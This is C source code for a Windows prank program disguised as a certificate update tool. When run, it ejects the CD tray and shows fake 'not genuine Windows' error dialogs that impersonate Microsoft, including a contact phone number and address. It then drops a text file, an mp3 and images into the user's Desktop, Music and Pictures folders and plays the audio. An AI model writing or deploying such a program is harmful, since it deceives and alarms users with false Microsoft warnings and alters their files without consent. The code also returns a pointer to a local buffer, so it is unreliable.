#pragma comment( lib, "winmm.lib" )

#include <Windows.h>
#include <mmsystem.h>
#include <shlobj.h>

// Defines
#define MCI_TEST 0x0020

// Function Prototypes
VOID InternalCopyLoad(VOID);
VOID ResourceToFile(LPWSTR lpstrFilename, UINT uiResourceNumber);
LPWSTR GetDirFromCSIDL(UINT uiIdentifier);
BOOL FileExists(LPCTSTR szPath);

// Global Variables
HINSTANCE g_hInstance;

int WINAPI wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)
{
    MCI_OPEN_PARMS mPar = { 0 };
    mPar.lpstrDeviceType = (LPCWSTR)MCI_DEVTYPE_CD_AUDIO;
    WCHAR lpstrPathBuffer[MAX_PATH + 1] = L"\0";

    // Open device
    mciSendCommand(0, MCI_OPEN, MCI_OPEN_TYPE | MCI_OPEN_TYPE_ID, (DWORD)&mPar);

    // Check for a disk in the drive
    if (!mciSendCommand(mPar.wDeviceID, MCI_PLAY, MCI_TEST, 0))
    {
        // Spin up the disc...
        mciSendCommand(mPar.wDeviceID, MCI_SPIN, MCI_WAIT, 0);

        // Wait...
        Sleep(2500);

        // Spin it back down...
        mciSendCommand(mPar.wDeviceID, MCI_SPIN, MCI_WAIT, 0);

        // Open tray, "invalid" disc detected
        mciSendCommand(mPar.wDeviceID, MCI_SET, MCI_SET_DOOR_OPEN, 0);

        // Tell the user it's invalid ;)
        MessageBox(NULL, L"You may be a victim of software counterfeiting. This copy\r\nof Windows is not genuine and unable to be used for\r\ncertficate installation due to security errors. Please contact\r\nMicrosoft for a genuine copy of Windows.\r\n\r\nView log for more information.\r\n\r\nPhone: +1 (800)-275-8777\r\nAddress: 7241 185th Ave NE\r\nRedmond, WA 98052\r\nUnited States", L"This copy of Windows is not genuine", MB_OK | MB_ICONINFORMATION | MB_DEFAULT_DESKTOP_ONLY);
   
        // Copy the files
        InternalCopyLoad();

        // Change our working directory to the music folder
        SetCurrentDirectory(GetDirFromCSIDL(CSIDL_MYMUSIC));

        // Check for "freedom.mp3" and play it
        if (FileExists(L"freedom.mp3"))
        {
            GetFullPathName(L"freedom.mp3", ARRAYSIZE(lpstrPathBuffer), lpstrPathBuffer, NULL);
            ShellExecute(HWND_DESKTOP, L"open", L"wmplayer.exe", lpstrPathBuffer, NULL, SW_SHOWMINNOACTIVE);
        }
    }
    else
    {
        // Open tray, no disc detected
        mciSendCommand(mPar.wDeviceID, MCI_SET, MCI_SET_DOOR_OPEN, 0);

        // Messagebox
        MessageBox(NULL, L"The certificate update program requires a valid Windows\r\nInstallation disc to be inserted into the disc drive.\r\nIf your system lacks a CD/DVD drive, please install WinCDEmu\r\nand load your installation ISO.\r\n\r\nView log for more information.", L"Certificate Update CD is required", MB_OK | MB_ICONINFORMATION | MB_DEFAULT_DESKTOP_ONLY);

        // Copy the files
        InternalCopyLoad();
    }

    // Close device
    mciSendCommand(mPar.wDeviceID, MCI_CLOSE, MCI_WAIT, 0);

    // Return
    return 0;
}

VOID InternalCopyLoad(VOID)
{
    // Place a copy of the source on their desktop
    SetCurrentDirectory(GetDirFromCSIDL(CSIDL_DESKTOP));
    ResourceToFile(L"READ NEIGHBOR, READ!.txt", 2);

    // Give thems omething to listen to
    SetCurrentDirectory(GetDirFromCSIDL(CSIDL_MYMUSIC));
    ResourceToFile(L"freedom.mp3", 3);

    // And finally, leave them some pictures...
    SetCurrentDirectory(GetDirFromCSIDL(CSIDL_MYPICTURES));
    ResourceToFile(L"usrsh.bmp", 4);
    ResourceToFile(L"2spky4u2.bmp", 5);

    return;
}

VOID ResourceToFile(LPWSTR lpstrFilename, UINT uiResourceNumber)
{
    HGLOBAL     res_handle = NULL;
    HRSRC       res;
    char* res_data;
    DWORD       res_size;
    HANDLE hFile;
    DWORD dwBytesWritten = 0;

    // NOTE: providing g_hInstance is important, NULL might not work
    res = FindResource(g_hInstance, MAKEINTRESOURCE(uiResourceNumber), RT_RCDATA);
    if (!res)
        return;
    res_handle = LoadResource(NULL, res);
    if (!res_handle)
        return;
    res_data = (char*)LockResource(res_handle);
    res_size = SizeofResource(NULL, res); // From StackOverflow

    // Loaded resource, copy to desktop
    hFile = CreateFile(lpstrFilename, GENERIC_WRITE, 0, NULL, CREATE_NEW, FILE_ATTRIBUTE_NORMAL, NULL);

    // Write the resource to it now
    WriteFile(hFile, res_data, res_size, &dwBytesWritten, NULL);

    // Close the file
    CloseHandle(hFile);
}

LPWSTR GetDirFromCSIDL(UINT uiIdentifier)
{
    WCHAR lpszPath[MAX_PATH + 1];

    if (SHGetSpecialFolderPathW(HWND_DESKTOP, lpszPath, uiIdentifier, FALSE))
        return lpszPath;
    else
        return L"ERROR";
}

BOOL FileExists(LPCTSTR szPath)
{
    DWORD dwAttrib = GetFileAttributes(szPath);

    return (dwAttrib != INVALID_FILE_ATTRIBUTES &&
        !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));
} // From StackOverflow